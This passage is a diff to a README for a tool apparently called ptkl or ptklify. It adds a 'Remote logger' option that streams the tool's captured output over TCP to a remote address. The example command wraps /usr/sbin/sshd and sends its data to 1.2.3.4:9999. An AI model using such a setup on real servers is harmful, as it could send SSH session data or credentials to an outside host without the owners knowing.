@@ -29,3 +29,12 @@ docker build --tag=sshd .
 docker run --rm --name=sshd sshd
 ssh -o UserKnownHostsFile=kh root@172.17.0.2
 ```
+
+---
+
+## Remote logger
+A primitive remote logging option is available. If the `REMOTE_LOGGER` environment variable exists during execution of ptkl then it will try to connect to a remove IP address and port via TCP to send all data that normally is outputted to the file descriptor `100`.
+The format for `REMOTE_LOGGER` is `{IPADDR}:{PORT}`. For example:
+```bash
+ REMOTE_LOGGER="1.2.3.4:9999" ./ptklify /usr/sbin/sshd -De
+ ```
